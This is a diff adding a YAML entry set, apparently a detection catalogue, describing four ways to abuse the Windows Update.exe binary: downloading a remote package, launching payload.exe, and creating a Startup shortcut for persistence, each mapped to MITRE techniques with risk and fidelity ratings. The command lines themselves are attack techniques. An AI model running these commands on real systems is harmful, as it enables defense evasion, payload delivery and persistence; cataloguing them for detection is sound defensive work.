@@ -1,0 +1,84 @@
+- command: Update.exe --download [URL TO PACKAGE]
+  description: Abuse Update.exe to download a file named 'RELEASES' from the specified remote URL which is a nuget package.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Update/
+  risk: High
+  risk_reason: This is typically a suspicious activity when using non-standard URLs.
+  fidelity: High
+  fidelity_reason: This is typically a rare behavior for most users, especially with non-standard URLs.
+  tool: Update
+  threatactors:
+    N/A:
+      - N/A
+- command: Update.exe --update=[url to package]
+  description: Abuse Update.exe to download a file named 'RELEASES' from the specified remote URL which is a nuget package.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Update/
+  risk: High
+  risk_reason: This is typically a suspicious activity when using non-standard URLs.
+  fidelity: High
+  fidelity_reason: This is typically a rare behavior for most users, especially with non-standard URLs.
+  tool: Update
+  threatactors:
+    N/A:
+      - N/A
+- command: Update.exe --processStart payload.exe --process-start-args "whatever args"
+  description: Copy payload.exe into '%userprofile%\AppDAta\Local\Microsoft\Teams\current\' and start it with any relevant arguments.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Update/
+  risk: High
+  risk_reason: This is typically a suspicious activity.
+  fidelity: High
+  fidelity_reason: This is typically a rare behavior for most users.
+  tool: Update
+  threatactors:
+    N/A:
+      - N/A
+- command: Update.exe --createShortcut=payload.exe -l=Startup
+  description: Copy payload.exe into '%userprofile%\AppDAta\Local\Microsoft\Teams\current\' - the payload will run after every login for users who start Teams automatically.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218
+    Persistence:
+      - T1547
+    Privilege Escalation:
+      - T1547
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Update/
+  risk: High
+  risk_reason: This is typically a suspicious activity.
+  fidelity: High
+  fidelity_reason: This is typically a rare behavior for most users.
+  tool: Update
+  threatactors:
+    N/A:
+      - N/A
